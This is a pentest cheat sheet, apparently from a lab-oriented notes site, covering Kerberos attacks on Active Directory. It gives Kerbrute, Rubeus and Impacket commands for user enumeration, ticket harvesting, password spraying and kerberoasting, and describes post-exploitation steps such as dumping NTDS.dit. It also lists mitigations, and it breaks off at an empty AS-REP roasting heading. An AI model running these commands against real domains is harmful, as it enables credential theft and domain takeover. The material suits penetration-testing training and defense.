# Attacking Kerberos

## Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

## Enumeration w/ Kerbrute

Brute force user accounts from a domain controller using a supplied wordlist:

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Harvest for TGTs every 30 seconds:

```powershell
Rubeus.exe harvest /interval:30
```

## Brute-Forcing / Password-Spraying w/ Rubeus

{% hint style="info" %}
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
{% endhint %}

```powershell
Rubeus.exe brute /password:Password1 /noticket
```

This returns .kirbi ticket (TGT)

{% hint style="warning" %}
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
{% endhint %}

## Kerberoasting w/ Rubeus & Impacket

### Rubeus

Dump the Kerberos hash of any kerberoastable users:

```powershell
Rubeus.exe kerberoast
```

Now you can take the hash of the service and crack it (Hashcat mode 13100 for TGS-REP)

### Impacket

Dump the hash:

```bash
impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.2.205 -request
```

### What can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.&#x20;

If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit.&#x20;

If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.

### Kerberoasting Mitigation

* &#x20;Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* &#x20;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

## AS-REP Roasting w/ Rubeus

